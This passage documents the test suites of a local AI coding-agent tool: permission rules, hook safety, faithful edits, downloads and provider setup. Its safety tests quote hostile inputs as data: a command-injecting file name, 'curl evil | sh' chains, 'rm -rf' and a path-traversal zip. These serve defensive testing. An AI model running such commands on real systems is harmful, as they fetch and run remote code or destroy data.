Node, Go, Rust, gcc/g++ and PowerShell, so they all ran); everything else uses fakes and temporary folders.

## Helpers
@@ tests/test_phase9.py header @@
- `SAMPLES` holds, per extension, the program needed, a valid file and a broken one (TypeScript with an `enum`, Go,
  Rust, C, C++, PowerShell).

@@ tests/test_phase9.py check @@
- Writes a file into a folder and returns whether `verify_file` accepts it.

## Languages
@@ tests/test_phase9.py LanguageTests @@
@@ tests/test_phase9.py LanguageTests.test_each_installed_language_checker @@
@@ tests/test_phase9.py LanguageTests.test_missing_outside_header_is_not_an_error @@
@@ tests/test_phase9.py LanguageTests.test_unknown_and_tool_less_files_pass @@
- For every installed language: the valid file passes, the broken one fails (`subTest` reports each language
  separately; missing programs are skipped).
- A C file that includes a header which does not exist here passes (it cannot be checked without that library).
- An unknown file type passes; with the program "uninstalled" (a mock), even a nonsense `.go` file passes — checks are
  skipped, never failed, when their tool is missing. The checked-extension list includes the new languages.

## Streaming
@@ tests/test_phase9.py StreamTests @@
@@ tests/test_phase9.py StreamTests.lines @@
@@ tests/test_phase9.py StreamTests.test_text_and_tool_calls_are_assembled @@
@@ tests/test_phase9.py StreamTests.test_error_inside_a_stream @@
@@ tests/test_phase9.py StreamTests.test_summary_is_printed_when_streamed_text_differs @@
@@ tests/test_phase9.py StreamTests.test_a_streamed_answer_is_not_printed_twice @@
- `lines` turns event texts into `data: ...` lines ending with `[DONE]`, as a server sends them.
- Two text pieces become "Hello" and reach the display in order; a comment line is ignored; a tool call split over two
  chunks (name `read_` + `file`, argument text in two halves) is glued back together with its id and thought
  signature; the token counts from the last chunk are returned.
- An error object inside the stream raises `LLMError`.
- When the model streams "Working on it." but finishes with the summary "All done: 3 files.", both appear on screen.
- A model that streams "Let me look.", uses a tool, then streams its plain answer "The answer is 42." (how local
  models often answer) shows that answer exactly once.

## Helper agents
@@ tests/test_phase9.py HelperTests @@
@@ tests/test_phase9.py HelperTests.test_delegate_runs_a_read_only_helper_and_returns_its_report @@
@@ tests/test_phase9.py HelperTests.test_helper_leaves_the_main_routing_alone @@
@@ tests/test_phase9.py HelperTests.test_helpers_can_be_switched_off @@
- The main agent calls `delegate`; the helper is offered neither `delegate` nor `write_file`, its write attempt is
  refused, it searches and finishes; the main agent receives `HELPER REPORT: ...` and finishes. All 5 model calls are
  counted by the shared meter and the helper's steps are shown with `|`.
- A helper whose reads keep failing neither resets nor escalates the shared model chain: only the main agent's one
  reset at the start of its request is seen.
- With `helpers=False` the tool is not offered.

## Commands and tiers
@@ tests/test_phase9.py CommandAndTierTests @@
@@ tests/test_phase9.py CommandAndTierTests.test_custom_commands_load_and_expand @@
@@ tests/test_phase9.py CommandAndTierTests.test_paid_tier_puts_strong_models_first_with_higher_limits @@
- A user and a project `review.md`: the project one wins; a file with an invalid name is ignored; `$ARGUMENTS` is
  replaced, or the words are appended when the file has no placeholder.
- `LOCALAGENT_GEMINI_TIER=paid` gives 1000 requests/minute and 10 000/day, puts the strong models first and leaves no
  reserve to escalate to; `LOCALAGENT_RPM` overrides the limit directly.

## Big folders
@@ tests/test_phase9.py HookTests @@
@@ tests/test_phase9.py HookTests.test_after_edit_failure_reaches_the_model_and_after_request_runs @@
@@ tests/test_phase9.py HookTests.test_hooks_merge_from_settings_files @@
- A failing `after_edit` hook (it prints the file name and exits 3) leaves the write in place but appends
  `HOOK after_edit failed (exit code 3)` and its output to the result; `after_request` runs and returns its output;
  without hooks nothing runs. (The test command quotes its text so PowerShell and `sh` print it identically.)
- Hooks merge from the user and project settings files, the project winning per hook.

@@ tests/test_phase9.py BigFolderTests @@
@@ tests/test_phase9.py BigFolderTests.test_snapshots_switch_off_once_for_huge_folders @@
@@ tests/test_phase9.py BigFolderTests.test_workspace_check_can_look_only_at_recent_changes @@
@@ tests/test_phase9.py BigFolderTests.test_search_stops_on_enormous_folders @@
- With a 3-file limit, a 5-file folder switches `/undo` off with one message (the next snapshot is silent and `undo`
  explains why); a normal folder snapshots fine.
- A file broken an hour ago is found by a full check but not by a check of recent changes; a file broken now blocks
  `run_tests`; once it is gone, the old broken file does not block the tests.
- With the file limit lowered to 2 (a mock), a search stops with the "narrow the search" note.

@@ tests/test_phase9.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase10.py` — version 0.6: safety, faithful edits, offline/online, the Claude-Code-style chat

**Role:** proves every fix and feature of version 0.6. Each class below starts from a problem that was **reproduced
first** (a probe script showed the old behaviour) and then fixed; the test pins the fixed behaviour so it cannot
return. 59 tests, about 11 seconds, no model and no internet needed.

## Helpers
@@ tests/test_phase10.py header @@
- Imports the code under test (whole modules — `cli`, `localserver`, `runners` — where tests replace a function with a
  mock, and names otherwise). The runner function `test_kind` is called as `runners.test_kind`: imported by its name, a
  test tool such as pytest would mistake it for a test.
- `check_commit` is loaded **from its file** with `importlib`, because `tools/` is a folder of scripts, not a package.
- `FAKE_LLAMA` is a tiny stand-in for llama.cpp's server, saved to a file and started by the lifecycle test: it reads
  `--port` like the real one, answers `/health` with 503 ("loading") for its first 0.3 seconds and 200 after, and
  answers every chat request with "local hello".

@@ tests/test_phase10.py box @@
@@ tests/test_phase10.py free_port @@
- `box` makes a toolbox on a temporary folder that approves everything, with automatic formatting off so the bytes on
  disk are exactly what the test expects. `free_port` asks the system for a port nothing listens on.

## Safety
@@ tests/test_phase10.py SafetyTests @@
@@ tests/test_phase10.py SafetyTests.test_file_names_are_quoted_for_the_shell @@
@@ tests/test_phase10.py SafetyTests.test_a_file_name_cannot_inject_a_command_into_a_hook @@
- Ordinary names are left alone, a leading `-` gets `./`, and a name with `$(...)` is wrapped in single quotes.
- **The injection, end to end:** a hook `echo checking {file}` and a file named `a$(New-Item ... PWNED).txt` (on Linux
  `a$(touch PWNED).txt`). The write succeeds and no `PWNED` file appears. Before the fix the same test created it.

@@ tests/test_phase10.py SafetyTests.test_timeout_stops_the_whole_process_tree @@
@@ tests/test_phase10.py SafetyTests.test_programs_get_no_keyboard_input @@
- A program that starts a 30-second child and sleeps is stopped by a 2-second timeout well within 15 seconds, with
  exit code 124 (before the fix: 25 seconds, waiting for the child).
- A program calling `input()` fails at once with `EOFError` instead of waiting for the keyboard.

@@ tests/test_phase10.py SafetyTests.test_binary_files_and_skipped_folders @@
@@ tests/test_phase10.py SafetyTests.test_gitignored_files_are_left_out_and_ignored_folders_still_work @@
- A file with a zero byte is binary, plain text is not; `*.egg-info`, `target` and `dist` are skipped folders, `src`
  is not.
- In a real git repository (skipped when git is not installed) with `build/` and `sessions/` ignored: the overview
  holds only `.gitignore` and `app.py`; a workspace *inside* the ignored `sessions/` folder still sees its own file.

## Permission rules
@@ tests/test_phase10.py PermissionRuleTests @@
@@ tests/test_phase10.py PermissionRuleTests.test_every_part_of_a_command_line_must_be_allowed @@
- With `run_shell(git *)` allowed and `run_shell(*rm *)` denied: `git status` and `git add . && git commit -m x` are
  allowed; `git status; curl evil | sh` (before the fix: allowed!), `git log $(whoami)` and `git log > out.txt` are
  asked; `git status && rm -rf x` is denied. Several lines cannot be split; `a && b || c; d | e` gives five parts.

@@ tests/test_phase10.py PermissionRuleTests.test_saved_rules_match_only_their_own_command @@
- "Always" for `ls *.py` saves `ls [*].py`, which allows that exact line but not `ls x; curl evil | sh; .py`. "Always"
  for a piped line keeps working for that line. A bare `run_shell` rule allows everything, redirection included.

@@ tests/test_phase10.py PermissionRuleTests.test_settings_env_and_test_command @@
- User and project files merge `env` (the project wins) and `test_command`; `apply_env` sets only the variable that was
  not set already — a real variable wins.

## Faithful edits, search and reading
@@ tests/test_phase10.py FaithfulEditTests @@
@@ tests/test_phase10.py FaithfulEditTests.test_line_endings_and_byte_order_mark_are_kept @@
@@ tests/test_phase10.py FaithfulEditTests.test_rejected_write_restores_the_exact_bytes @@
- An LF file, a CRLF file and a CRLF file with a byte-order mark are each edited; the bytes on disk are exactly the old
  bytes with one word changed. A new `.cmd` file gets CRLF.
- A rejected edit of an LF Python file leaves its bytes untouched (before the fix it came back with CRLF).

@@ tests/test_phase10.py FaithfulEditTests.test_python_with_a_byte_order_mark_or_an_old_encoding_is_valid_code @@
- A Python file starting with a byte-order mark (as PowerShell writes it) and a latin-1 file with a coding line both
  pass the workspace check, the first one also runs; an edit whose `old` names the mark removes it. Added after the
  live offline test in which the mark was taken for a syntax error.

@@ tests/test_phase10.py FaithfulEditTests.test_empty_old_text_is_refused @@
- `edit_file` with an empty `old` and `all=true`, and `multi_edit` with an empty `old`, are both refused; the file still
  says `abc` (before the fix: `XaXbXcX`).

@@ tests/test_phase10.py FaithfulEditTests.test_search_covers_every_text_file @@
- A search without a glob finds `.ts`, `.js` and `.py` files but not the binary one; `*.{js,ts}` finds exactly the two;
  `src/*` matches by path; and `path` may name one file.

@@ tests/test_phase10.py FaithfulEditTests.test_read_file_refuses_binary_and_says_how_much_is_left @@
- A binary file is refused. Reading lines 2-3 of a 10-line file ends with `(lines 2-3 of 10)`; starting at line 50 says
  the file has only 10 lines. With the size limit lowered to 10 bytes (a mock), a whole read is refused but a range is
  read line by line.

## Language checks
@@ tests/test_phase10.py LanguageCheckTests @@
@@ tests/test_phase10.py LanguageCheckTests.check @@
@@ tests/test_phase10.py LanguageCheckTests.test_json_with_comments_where_the_format_allows_them @@
- One JSONC text (comments, trailing commas, and a string containing `//` and `, }`) passes as `tsconfig.json` and as
  `settings.jsonc` but fails as `package.json`; a JSON file with a byte-order mark passes; `strip_jsonc` keeps strings
  intact.

@@ tests/test_phase10.py LanguageCheckTests.test_header_files_may_be_c_or_cpp @@
@@ tests/test_phase10.py LanguageCheckTests.test_rust_files_may_name_modules_not_written_yet @@
- A C++ header and a C header named `.h` both pass, a broken one fails (needs gcc and g++).
- `main.rs` declaring a module that does not exist yet passes; a syntax error still fails (needs rustfmt).

## Running tests the project's way
@@ tests/test_phase10.py TestRunnerTests @@
@@ tests/test_phase10.py TestRunnerTests.test_the_right_test_tool_is_chosen @@
- An empty folder → `python`; a `package.json` with a real test script → `npm`; npm's placeholder script → `python`;
  a `go.mod` → `go`; Python tests in a plain `tests` folder → `python` again (they win), started with `-s tests`.

@@ tests/test_phase10.py TestRunnerTests.test_tests_in_a_plain_tests_folder_are_found @@
@@ tests/test_phase10.py TestRunnerTests.test_your_own_test_command_from_the_settings @@
@@ tests/test_phase10.py TestRunnerTests.test_the_project_virtual_environment_is_used @@
- A test in `tests/` without `__init__.py` really runs (`Ran 1 test`, or `1 passed` where pytest is installed) — before
  the fix: `Ran 0 tests`, exit code 5.
- A `test_command` from the settings is what runs.
- Without a project environment the agent's Python is used; with a `.venv` holding a Python, that one is.

## History, empty answers, cut-off answers, switching
@@ tests/test_phase10.py HistoryTests @@
@@ tests/test_phase10.py HistoryTests.history @@
- A small conversation whose first tool call writes 5 000 characters (with a thought signature) and whose tool result
  has 3 000.

@@ tests/test_phase10.py HistoryTests.test_tool_call_arguments_count_and_are_shortened_last @@
@@ tests/test_phase10.py HistoryTests.test_oldest_exchanges_are_dropped_only_as_a_last_resort @@
- The call's size includes its arguments. A budget of 6 000 blanks the old output but keeps the arguments; a budget
  of 1 000 also shortens them (keeping `path`, dropping the signature). The original list is never changed.
- When even that cannot fit (a 9 000-character first request), the oldest exchange is dropped: the result starts with
  the system prompt and the next user message, and the last four messages are unchanged.

@@ tests/test_phase10.py HistoryTests.make @@
@@ tests/test_phase10.py HistoryTests.test_the_agent_measures_arguments_too @@
@@ tests/test_phase10.py HistoryTests.test_an_empty_answer_is_retried_once @@
- `make` builds an agent with a scripted model. Adding the big call grows the agent's measured size by more than 5 000.
- An empty answer followed by "4" returns "4", with the reminder in the history and no empty assistant message left
  in it; two empty answers return `EMPTY_TWICE`.

@@ tests/test_phase10.py HistoryTests.test_cut_off_arguments_are_explained_and_a_cut_off_answer_is_kept @@
@@ tests/test_phase10.py HistoryTests.test_polite_requests_still_count_as_changes @@
@@ tests/test_phase10.py HistoryTests.test_switching_models_keeps_the_conversation @@
- A `write_file` with cut-off arguments gets `BAD_ARGUMENTS`; a cut-off `finish` returns
  `The answer is 42 bec [answer cut off]`.
- "Please fix", "can you add", "Go ahead and create", "I want you to rename" want changes; "Can you explain", "why is
  it slow" and "please" alone do not.
- After `set_backend` the new model answers, `agent.backend` is it, and the first request is still in the history.

## Sessions and `/undo`
@@ tests/test_phase10.py SessionAndUndoTests @@
@@ tests/test_phase10.py SessionAndUndoTests.test_resume_skips_what_reset_or_compact_left_behind @@
@@ tests/test_phase10.py SessionAndUndoTests.test_agent_marks_reset_and_compaction_in_the_log @@
- A log with "secret topic", a reset, "new topic" and a half-written line resumes with only "new topic"; its title
  still shows the first request.
- An agent that answered, was reset, answered twice and compacted resumes with the summary first, and the request from
  before the reset is gone.

@@ tests/test_phase10.py SessionAndUndoTests.test_undo_skips_quiet_requests_and_keeps_your_own_edits @@
@@ tests/test_phase10.py SessionAndUndoTests.test_a_same_size_edit_in_the_same_clock_tick_is_still_seen @@
@@ tests/test_phase10.py SessionAndUndoTests.test_snapshots_store_each_content_once @@
- A request changes `a.txt` and `b.txt` and creates `c.txt`; a question changes nothing; then *you* edit `b.txt`. `/undo`
  restores `a.txt`, removes `c.txt`, leaves your `b.txt` alone and says so, naming the request; the question was never
  an undo step. A second `/undo` has nothing to do.
- A same-size edit given the file's old time stamp (`os.utime`, imitating Windows' coarse clock) is still noticed
  and undone. With `RACY_NS` set to 0 the test fails — it reproduces the bug CI found on Windows.
- Five files with the same content, snapshotted three times, are stored once.

## Offline detection
@@ tests/test_phase10.py OfflineTests @@
@@ tests/test_phase10.py OfflineTests.chain @@
- A chain of one rate-limited ("hosted") model and optionally a local one, with an injectable probe and clock.

@@ tests/test_phase10.py OfflineTests.test_no_internet_goes_straight_to_the_local_model_and_back @@
- The whole cycle with a fake clock: a name-lookup failure is not retried, the local model answers, and an "unreachable"
  notice appears; the next call skips the hosted model entirely; after the cool-down, with the probe still failing, it
  is skipped again (no request sent); when the probe succeeds the hosted model answers and "back online" is announced.

@@ tests/test_phase10.py OfflineTests.test_a_repeated_network_error_also_means_offline @@
@@ tests/test_phase10.py OfflineTests.test_without_a_local_model_the_error_says_what_to_do @@
@@ tests/test_phase10.py OfflineTests.test_a_final_error_is_not_retried @@
- Two network errors (no name failure) mean offline after one retry. Without a local model the error starts with
  `OFFLINE_HELP`. A `final` error from the local model is not retried (one call).

## Rate limiter, configuration
@@ tests/test_phase10.py LimiterTests @@
@@ tests/test_phase10.py LimiterTests.test_pacific_time_without_time_zone_data @@
@@ tests/test_phase10.py LimiterTests.test_one_shared_limiter_per_model_and_long_waits_are_announced @@
- The daylight-saving switches of 2026 to the minute (8 March 10:00 UTC, 1 November 09:00 UTC); and with `zoneinfo`
  made unavailable (as on Windows), 23:30 on 1 July in California is still 1 July (the old fallback said 2 July).
- The same model and limits give the same limiter object. A limiter of 1 request per minute announces the wait for
  the second request; the usage folder holds only `usage.json` afterwards (no temporary files left).

@@ tests/test_phase10.py ConfigTests @@
@@ tests/test_phase10.py ConfigTests.test_bad_values_are_explained @@
- `LOCALAGENT_NUM_CTX=8k` and an unknown `LOCALAGENT_MODE` raise explanations naming the variable; `OFFLINE` in capitals
  and `LOCALAGENT_GPU_LAYERS=9` are read correctly.

## The local model server
@@ tests/test_phase10.py LocalServerTests @@
@@ tests/test_phase10.py LocalServerTests.test_files_are_found_where_they_are_expected @@
@@ tests/test_phase10.py LocalServerTests.test_command_line_and_where_a_server_may_be_started @@
- With `HOME` pointed at a temporary folder: the model file is found and `mmproj-*.gguf` never chosen; no server
  program means none is found; an explicit model path wins.
- The command line carries the port from the address, and `-ngl` only when GPU layers were set. A server may be
  started for `127.0.0.1` but not for a remote address.

@@ tests/test_phase10.py LocalServerTests.test_a_running_server_is_used_and_the_history_fitted @@
@@ tests/test_phase10.py LocalServerTests.test_nothing_local_is_a_final_error @@
- With a fake OpenAI-style server running, the local model answers through it, and a conversation four times too big
  for a 2 000-token window reaches the server shortened.
- With nothing running and nothing to start, the error is `final` and says "No local model".

@@ tests/test_phase10.py LocalServerTests.test_llama_server_is_started_waited_for_and_stopped @@
- **The real start-up, with the fake server program:** `LocalModel` finds nothing running, starts the program (its
  command line replaced by the fake), waits through the "loading" answers until `/health` says 200, answers "local
  hello", reports "starting" and "ready", and the process is stopped afterwards. (The real `llama-server.exe` was also
  checked separately — see `localserver.md`.)

## Modes and the chat
@@ tests/test_phase10.py ModeTests @@
@@ tests/test_phase10.py ModeTests.choose @@
- Runs `choose_mode` with a key or not and a chosen kind of local model (the three detection functions replaced by
  mocks, `describe_local` by a fixed text).

@@ tests/test_phase10.py ModeTests.test_each_mode_chooses_its_models @@
@@ tests/test_phase10.py ModeTests.test_impossible_modes_say_what_to_do @@
- Online: Gemini, no backup. Auto with a key: Gemini plus the local backup (or Ollama). Auto without a key: the local
  model with an 8K budget and a note saying why ("no online model is set up"). Offline: the local model even with a
  key.
- Online without a key, offline without a local model, auto with nothing, and an unknown mode each raise an
  explanation.

@@ tests/test_phase10.py ModeTests.test_backends_for_the_modes @@
@@ tests/test_phase10.py ModeTests.test_flags @@
- `local` builds a `LocalModel`; a Gemini chain with a `local` fallback ends with a `LocalModel` and has a probe; labels
  name the local model by its file.
- `--offline`, `--online`, `--mode`, `-p` and `-c` set what they should; `--version` prints the version.

@@ tests/test_phase10.py ChatTests @@
@@ tests/test_phase10.py ChatTests.chat @@
@@ tests/test_phase10.py ChatTests.say @@
- `chat` builds a `Chat` with a scripted model (and `run_tests` allowed); `say` types one line and returns what was
  printed.

@@ tests/test_phase10.py ChatTests.test_bang_runs_a_command_and_its_output_goes_with_the_next_request @@
@@ tests/test_phase10.py ChatTests.test_hash_saves_a_note_and_at_attaches_a_file @@
@@ tests/test_phase10.py ChatTests.test_attachments_respect_the_size_limit @@
- `!echo hello-from-shell` prints the output with no model call; the next request carries it, followed by "My
  request: ...".
- `# always use type hints` lands under `## Notes`, before the next section, and is in the system prompt at once.
  `@app.py` attaches the file (and `me@example.com` is ignored).
- A file bigger than the limit, and a missing file, are not attached; trailing punctuation after `@big.txt.` is ignored.

@@ tests/test_phase10.py ChatTests.test_model_status_and_switching @@
@@ tests/test_phase10.py ChatTests.test_clear_resume_permissions_and_unknown_commands @@
- `/model` shows the mode and the offline model. `/offline` (with the mode choice and backend mocked) switches the agent
  to the new backend and mode. A failing switch (`no key`) is reported and changes nothing.
- `/clear` empties the conversation; `/resume` lists it (marked as this conversation); `/permissions` shows the rules;
  an unknown command says so; `/exit` quits.

@@ tests/test_phase10.py ChatTests.test_print_mode_answers_once @@
@@ tests/test_phase10.py ChatTests.test_prompts_without_a_keyboard_mean_no @@
@@ tests/test_phase10.py ChatTests.test_colours_only_where_wanted @@
@@ tests/test_phase10.py ChatTests.test_overview_summarises_crowded_folders @@
- `-p`: the answer alone on standard output, exit code 0, and a `run_tests` the model asked for is refused (nobody to ask).
- An approval or a confirmation with no input means no.
- With colours an added diff line is green; without, plain; `NO_COLOR` switches colours off.
- 30 DLLs, two source files and a README in 6 lines: the README, one summary line for `bin/`, both source files.

## The commit guard
@@ tests/test_phase10.py CommitGuardTests @@
@@ tests/test_phase10.py CommitGuardTests.test_problems_in_staged_files @@
@@ tests/test_phase10.py CommitGuardTests.test_only_a_private_author_address_passes @@
- A clean file passes; a fake Google key (built at run time) is found; `.env` is refused but `.env.example` is fine; a
  5 GB model file gets two problems (its kind and its size) without being read.
- A noreply author passes; a Gmail author gets the explanation.

@@ tests/test_phase10.py footer @@
- Lets you run the file directly.

---
# `tests/test_product.py` — the product commands

**Role:** proves the parts that turn the agent into a downloadable product — verified and resumable downloads, safe
unpacking, the model catalog, `localagent setup` and `localagent models` — without downloading anything real: a small
local file server plays GitHub and Hugging Face. 12 tests, about 3 seconds. (The guided setup's own tests are in
`test_providers.py`, next to the provider choices it offers.)

## Helpers
@@ tests/test_product.py header @@
- `DATA` is 1 MB of test content and `DATA_SHA` its checksum, standing in for a model file.

@@ tests/test_product.py RangeServer @@
@@ tests/test_product.py RangeServer.__init__ @@
@@ tests/test_product.py RangeServer.close @@
- A file server on a free local port that records every `Range` header it receives, answers a Range request with `206`
  and the rest of the file (or, with `honour_range=False`, ignores it and sends everything with `200`), and with
  `cut_at` sends only that many bytes — a connection that "breaks".

## Downloads
@@ tests/test_product.py DownloadTests @@
@@ tests/test_product.py DownloadTests.serve @@
@@ tests/test_product.py DownloadTests.test_a_download_is_verified_and_kept_once @@
@@ tests/test_product.py DownloadTests.test_a_wrong_checksum_deletes_the_file @@
- A download arrives complete and reports progress up to its size; asking again sends no second request.
- With a wrong checksum the download fails and nothing is left in the folder — not even the part.

@@ tests/test_product.py DownloadTests.test_an_interrupted_download_continues_where_it_stopped @@
@@ tests/test_product.py DownloadTests.test_a_server_ignoring_the_range_sends_everything_again @@
- A connection that breaks after 300 000 bytes leaves exactly that part and the advice to run again; the next run asks
  only for `bytes=300000-` and ends with the complete, verified file.
- A server that ignores the Range request still ends with the right file (the part is started again).

@@ tests/test_product.py DownloadTests.test_archives_are_unpacked_only_inside_their_folder @@
- A normal zip unpacks; a zip with `../outside.txt` is refused and writes nothing outside; a `.tar.gz` (the Linux and
  macOS format) unpacks too.

## Catalog and llama.cpp
@@ tests/test_product.py CatalogTests @@
@@ tests/test_product.py CatalogTests.test_the_suggestion_follows_the_memory @@
- 15.7 GB → the 8B model, 7.8 GB → 4B, 4 GB → 1.7B, unknown → 4B; names match in any case; this computer's memory is
  read; every catalog entry has a 64-character checksum and a matching address.

@@ tests/test_product.py CatalogTests.test_the_newest_llama_build_with_a_checksum_is_chosen @@
- Three releases: a placeholder like llama.cpp's real `v1.0.0`, one whose file has no checksum, and one with both
  builds. The Vulkan build of the third is chosen; a platform no release has gives a clear error.

@@ tests/test_product.py CatalogTests.test_llama_cpp_is_installed_from_a_verified_archive @@
@@ tests/test_product.py CatalogTests.test_a_model_goes_to_the_models_folder @@
- A zip holding a fake `llama-server.exe`, served locally, is downloaded, verified, unpacked into its build folder,
  and its archive deleted.
- A model download is asked for with the catalog's address, checksum and size, into the models folder.

## The models command and the settings file
@@ tests/test_product.py SetupTests @@
@@ tests/test_product.py SetupTests.test_models_list_and_use @@
@@ tests/test_product.py SetupTests.test_saving_a_setting_keeps_the_others @@
@@ tests/test_product.py SetupTests.test_the_commands_are_reached_from_the_command_line @@
- The list marks the model in use with `*`; `use qwen3-4b` saves its full path; a model that is not there, an unknown
  download and an unknown action each return 2.
- Saving two variables keeps the permission rules already in the file; saving `None` forgets one again; on Linux and
  macOS the file can be read by its owner only (mode 600), because it can hold keys.
- `localagent models use qwen3-4b` and `localagent setup` reach their functions; `--help` names the commands.

@@ tests/test_product.py footer @@
- Lets you run the file directly.

---
# `tests/test_providers.py` — online services, your own servers, and the guided setup

**Role:** proves everything about choosing who answers — the provider table, the client's per-service details, the
configuration, the modes with another service, the doctor's check, the first-start offer and every path through
`localagent setup` — with no internet, no key and no model: a small local server plays the services. 28 tests, about
7 seconds. (The real services were checked live once by hand, see the build log.)

## Helpers
@@ tests/test_providers.py header @@
- Imports the modules under test and the standard pieces for a local HTTP server. `USAGE` is the token count every fake
  answer reports.

@@ tests/test_providers.py clean_env @@
- This process's environment without any `LOCALAGENT_*`/`OLLAMA_*` setting or `*_API_KEY`, plus the given extras —
  so a key on the developer's own computer (the reference laptop has `GEMINI_API_KEY` set) can never change a result.

@@ tests/test_providers.py FakeService @@
@@ tests/test_providers.py FakeService.__init__ @@
@@ tests/test_providers.py FakeService.close @@
- A server on a free local port that answers like an OpenAI-compatible service: `GET /v1/models` (a list of the given
  model names; `None` = no such list), `POST /v1/chat/completions` (the answer `hi`, streamed when asked, with token
  counts) and, with `ollama`, Ollama's `GET /api/tags`. `key` makes it answer 401 to any other key; `refuse` makes it
  answer 400 to requests containing those fields, naming the field like OpenAI does. Every request is recorded with its
  headers (in lower case) and body.

## The tables
@@ tests/test_providers.py ProviderTests @@
@@ tests/test_providers.py ProviderTests.test_the_table_is_complete @@
@@ tests/test_providers.py ProviderTests.test_keys_travel_in_the_headers_each_service_expects @@
- Names are unique, Gemini comes first, every entry has a key variable, title and price note, and every service but
  `custom` an `https://` address and key page. Names are found in any case; an unknown one is `None`.
- Anthropic gets the key twice (`Authorization` and `x-api-key`) plus `anthropic-version`; OpenAI only the bearer
  header; no key, no headers.

@@ tests/test_providers.py ProviderTests.test_good_models_are_suggested @@
- `gpt-5-mini` beats `gpt-4.1` and `whisper-1`; Anthropic's dated `claude-sonnet-4-5-20250929` matches its suggestion;
  with no suggestion offered the first chat model (not the embedding model) is taken; nothing offered gives `""`.
  Locally, `qwen3:8b` beats `llama3.1:8b` and an embedding model, a `coder` model beats both, and an unknown model is
  still taken when it is the only one.

@@ tests/test_providers.py ProviderTests.test_keys_are_checked_by_listing_models @@
- Against a fake service with a key: the right key is `ok` with the two models, a wrong one `rejected` with `HTTP 401`
  in the detail; once the service is closed, `unreachable`.

@@ tests/test_providers.py ProviderTests.test_local_servers_are_found_with_their_models @@
- A fake Ollama and a fake LM Studio are found with their models; the same address with a trailing `/` is asked only
  once; a port where nothing listens is left out. The real default ports are switched off for the test, so a server
  running on the developer's computer cannot change the result.

## The client
@@ tests/test_providers.py ClientTests @@
@@ tests/test_providers.py ClientTests.client @@
- An `OpenAICompatClient` for the fake service with a given provider entry, streaming or not.

@@ tests/test_providers.py ClientTests.test_a_service_gets_its_headers_and_answer_length @@
@@ tests/test_providers.py ClientTests.test_a_refused_field_is_left_out_from_then_on @@
@@ tests/test_providers.py ClientTests.test_other_refusals_are_reported @@
- As Anthropic: the request carries `x-api-key`, `anthropic-version` and `max_tokens` 16 384, and the streamed answer
  and its token count arrive.
- A service that refuses `temperature`: the first request is refused, the client leaves the field out and succeeds,
  remembers it (`dropped`), and the next conversation is sent without it at once — three requests in all.
- A refusal that names no optional field is raised as an `LLMError` (HTTP 400) after one request.

## Configuration
@@ tests/test_providers.py OnlineConfigTests @@
@@ tests/test_providers.py OnlineConfigTests.test_the_online_service_comes_from_the_environment @@
@@ tests/test_providers.py OnlineConfigTests.test_what_is_missing_is_said @@
- `LOCALAGENT_PROVIDER=OpenAI` (any case) with `OPENAI_API_KEY` and a model gives the service, its key, model and
  address; `LOCALAGENT_PROVIDER_BASE` replaces the address (without its trailing `/`); an unknown provider and a wrong
  `LOCALAGENT_LOCAL_SERVER` are explained errors.
- `online_problem` names the missing Gemini key, the missing OpenAI key, the missing model, the missing custom address
  — and says nothing for a complete setup, or for a custom address with a model but no key.

## Modes, the doctor, the first start
@@ tests/test_providers.py HostedModeTests @@
@@ tests/test_providers.py HostedModeTests.test_another_service_answers_with_the_local_model_as_backup @@
- With OpenAI set up: `auto` gives backend `hosted` with the local backup and the note `mode auto: OpenAI gpt-5-mini
  answers (OPENAI_API_KEY is set)`; `online` has no backup; the label reads `openai:gpt-5-mini > local:Qwen3-8B`;
  `make_hosted` builds the chain `openai:gpt-5-mini`, `local` with the OpenAI entry and a probe; without a model it
  refuses with the reason.

@@ tests/test_providers.py HostedModeTests.test_the_provider_flag @@
- `--provider openrouter:qwen/qwen3-coder:free` keeps the model's own colon and reads the OpenRouter key; an unknown
  name is a `ValueError`; naming the saved service without a model keeps the saved model.

@@ tests/test_providers.py HostedModeTests.test_a_chosen_local_server_is_trusted @@
- A chosen Ollama is the local kind without any network check; when Ollama is down, a server at `api_base` does not
  count and the description says Ollama is not running; offline mode builds a `LocalModel` limited to Ollama.

@@ tests/test_providers.py HostedModeTests.test_doctor_checks_another_service @@
- Against a fake service with a key that names its model the way Gemini does (`models/m1`): healthy, `key accepted`,
  `ok    model m1`. A model it does not offer and a wrong key each fail with the reason.

@@ tests/test_providers.py HostedModeTests.test_the_first_start_offers_the_setup @@
- With a "terminal" faked and nothing set up: Enter runs the setup once; `n` declines; a working online model and a
  `-p` run are never asked.

## The guided setup
@@ tests/test_providers.py WizardTests @@
@@ tests/test_providers.py WizardTests.run_setup @@
- Runs `run_setup` in a clean environment with typed answers (input "ends" after them), pasted keys, a fake list of
  running servers, a fake key check, and fake downloads that make llama.cpp and the model appear; returns the exit
  code, everything said, the saved `env` (`None` when no file was written) and the key-check mock.

@@ tests/test_providers.py WizardTests.test_a_free_gemini_key_is_checked_and_saved @@
@@ tests/test_providers.py WizardTests.test_a_key_already_set_is_found_and_a_good_model_suggested @@
@@ tests/test_providers.py WizardTests.test_a_refused_key_saves_nothing @@
@@ tests/test_providers.py WizardTests.test_any_openai_compatible_address @@
- Enter, Enter: Gemini with the pasted key — exactly the key and the provider are saved; online only.
- With `OPENAI_API_KEY` set, OpenAI is marked `[key found]` and suggested; Enter twice saves OpenAI and `gpt-5-mini`
  (not the key: it is already in the environment); the check went to OpenAI's address with the bearer header.
- A refused Groq key saves nothing at all (no file is even created).
- A custom address (its trailing `/` dropped) with no key: the check is sent without key headers, the chat model
  `big-model` is suggested over `embed-x`, and service, model and address are saved.

@@ tests/test_providers.py WizardTests.test_a_running_ollama_is_offered_first @@
@@ tests/test_providers.py WizardTests.test_lm_studio_keeps_its_address @@
@@ tests/test_providers.py WizardTests.test_the_free_model_is_downloaded_and_used @@
@@ tests/test_providers.py WizardTests.test_another_address_is_tried_as_ollama_then_openai @@
- A running Ollama is choice 1 and Enter takes `qwen3:8b`: kind and model saved, no address (it is the default).
- LM Studio saves kind `openai`, its model and its address.
- With nothing found: "download a free model for me", yes, yes — llama.cpp and the model arrive, kind `openai` is
  saved, and the server address and model of an earlier choice are forgotten.
- Another address typed without `http://`: asked as Ollama first (nothing), then as an OpenAI-style server (one
  model), and saved with `http://` in front.

@@ tests/test_providers.py WizardTests.test_ending_input_changes_nothing @@
@@ tests/test_providers.py WizardTests.test_a_wrong_number_is_asked_again @@
@@ tests/test_providers.py WizardTests.test_answers_piped_in_by_a_script_work @@
